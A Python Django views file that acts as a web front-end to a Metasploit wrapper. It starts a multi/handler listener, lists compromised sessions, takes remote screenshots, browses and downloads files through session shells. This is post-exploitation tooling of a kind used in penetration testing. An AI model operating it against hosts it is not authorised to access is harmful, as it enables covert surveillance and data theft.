# -*- coding: utf-8 -*-
from __future__ import unicode_literals
from django.http import HttpResponse
import urllib
from django.shortcuts import render, redirect


from core.MsfToolbox import *
# Create your views here.

# Global
toolbox = MsfToolbox()


def init(request):
	toolbox.exploit_multi_handler()
	return redirect('sessions')


def jobs(request):
	jobs = toolbox.get_jobs()
	print jobs
	return render(request, 'server/jobs.html', {'jobs': jobs})


def home(request):
    return render(request, 'server/home.html')


def sessions(request):
	sessions = toolbox.get_sessions()
	return render(request, 'server/sessions.html', {'sessions': sessions})


def session(request, id):
	# TODO: rename screenshot
	toolbox.post_take_screenshot()
	images = toolbox.get_images()
	import time
	time.sleep(0.5)
	return render(request, 'server/session.html', {'id': int(id), 'images': images})


def tmp(request, id):
	# TODO: rename session
	shell = toolbox.get_session_shell(int(id))

	path = request.GET.get('path')
	print 'path', path

	ftype = request.GET.get('type')
	print 'type', ftype

	if path != None and ftype == 'dir':
		toolbox.cd(shell, path)
		return redirect('session', id)
	elif path != None and ftype == 'fil':
		toolbox.download(shell, path)

	(pwd, files) = toolbox.ls(shell)

	toolbox.add_routing_files(files)

	return render(request, 'server/session.html', {'id': int(id), 'files': files, 'pwd': pwd})
